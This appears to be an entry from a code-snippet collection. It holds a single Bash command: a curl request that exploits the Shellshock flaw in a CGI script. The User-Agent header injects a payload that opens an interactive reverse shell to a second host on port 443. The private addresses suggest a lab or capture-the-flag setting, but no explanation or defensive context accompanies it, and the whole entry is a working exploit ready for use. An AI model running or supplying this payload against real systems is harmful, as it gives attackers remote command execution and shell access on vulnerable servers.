---
id: 6c2a5c57-11b9-4251-970b-721d708897aa
type: code
language: Bash
verified: false
created_at: '2020-03-16T05:00:22.762925+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 6c2a5c57

**Language**: Bash

```bash
curl http://10.10.10.10/cgi-bin/user.sh -H 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.100/443 0>&1"'
```


